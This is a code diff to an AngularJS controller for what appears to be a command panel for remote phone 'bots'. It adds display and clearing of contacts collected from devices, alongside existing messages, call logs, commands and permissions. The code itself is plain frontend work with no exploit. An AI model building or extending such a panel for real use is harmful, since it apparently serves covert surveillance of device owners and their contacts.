@@ -61,12 +61,13 @@ App
   'CommandService',
   'CallLogService',
   'PermissionService',
+  'ContactService',
   'socket',
   '$stateParams',
   'toastr',
   '$state',
   'bot',
-  function($scope, BotService, MessageService, CommandService, CallLogService, PermissionService, socket, params, toastr, $state, bot) {
+  function($scope, BotService, MessageService, CommandService, CallLogService, PermissionService, ContactService, socket, params, toastr, $state, bot) {
 
     $scope.bot = bot
     $scope.num_call_logs = 100;
@@ -75,6 +76,8 @@ App
     var messages = []
     $scope.hasMessages = false
     $scope.messageThreads = {}
+
+    $scope.contacts = []
 
     function reorderMessageThreads() {
       $scope.hasMessages = messages.length > 0
@@ -87,6 +90,7 @@ App
 
     socket.forward('bot:connected', $scope);
     socket.forward('bot:disconnected', $scope);
+    socket.forward('bot:updated', $scope);
     socket.forward('command:added', $scope);
     socket.forward('command:deleted', $scope);
     socket.forward('commands:cleared', $scope);
@@ -96,6 +100,7 @@ App
     socket.forward('call_log:cleared', $scope);
     socket.forward('getcallhistory:done', $scope);
     socket.forward('permissions:updated', $scope);
+    socket.forward('contact:created', $scope);
 
     MessageService.fetch($scope.bot.uid).then(function(res) {
       messages = res.data
@@ -114,10 +119,21 @@ App
       $scope.permissions = res.data;
     })
 
+    ContactService.fetch($scope.bot.uid).then(function(res) {
+      $scope.contacts = res.data;
+    })
+
     $scope.$on('socket:bot:connected', function(e, data) {
       if (data.uid === $scope.bot.uid) {
         $scope.bot = data;
         toastr.success('Device status changed to online', 'Online')
+      }
+    })
+
+    $scope.$on('socket:bot:updated', function(e, data) {
+      if (data.uid === $scope.bot.uid) {
+        $scope.bot = data;
+        toastr.success('Device info updated.', data.device)
       }
     })
 
@@ -172,6 +188,12 @@ App
       }
     })
 
+    $scope.$on('socket:contact:created', function(e, data) {
+      if (data.uid === $scope.bot.uid) {
+        $scope.contacts.push(data)
+      }
+    })
+
     $scope.addCommand = function(cmd, arg1, arg2) {
       CommandService.add({
           uid: $scope.bot.uid,
@@ -207,6 +229,13 @@ App
           $state.go('dashboard.home')
         })
       }
+    }
+
+    $scope.deleteContacts = function() {
+      ContactService.clear($scope.bot.uid).then(function () {
+        $scope.contacts = []
+        toastr.success('Contacts cleared.', $scope.bot.device)
+      })
     }
 
   }
